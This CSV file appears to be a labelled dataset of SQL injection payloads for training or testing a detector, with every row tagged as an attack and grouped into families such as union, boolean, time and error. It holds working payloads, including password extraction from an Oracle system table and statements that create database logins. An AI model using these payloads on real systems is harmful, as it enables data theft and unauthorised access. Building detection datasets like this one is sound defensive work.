label,payload,family
attack," select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select 1||1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 or "",."" or 1  =  1 -- 1",boolean
attack,admin'  )   or   (  '1'  =  '1,boolean
attack,  )   or   (  'x'  =  'x,boolean
attack,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",union
attack," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",union
attack,s,other
attack," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",union
attack,select * from users where id  =  1 %!<1 or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",boolean
attack,truncate,other
attack,"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",time
attack," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",union
attack,select * from users where id  =  1. <@ or 1  =  1 -- 1,boolean
attack, or true--,boolean
attack," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",boolean
attack,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",other
attack,"admin"" or ""1""  =  ""1""/*",boolean
attack," select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select .1$_,version  (    )   -- 1",union
attack,"""  )   or true--",boolean
attack," select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",boolean
attack,1  )   or pg_sleep  (  __TIME__  )  --,time
attack," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",boolean
attack,or ''  =  ',boolean
attack," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",union
attack,"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",time
attack,1 uni/**/on select all from where,union
attack," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",union
attack," select * from users where id  =  '1' union select \#,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",union
attack,"23 or 1  =  1, --",boolean
attack,select * from users where id  =  1 &@ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",union
attack," select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",union
attack,"exec sp_addlogin 'name' , 'password'",other
attack,0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,other
attack," select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",boolean
attack,group by userid having 1  =  1--,error
attack," select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",union
attack,or a  =  a,boolean
attack," select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",union
attack,select * from users where id  =  1 <@. or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",union
attack," union select * from users where login   =   char  (  114,111,111,116  )  ;",union
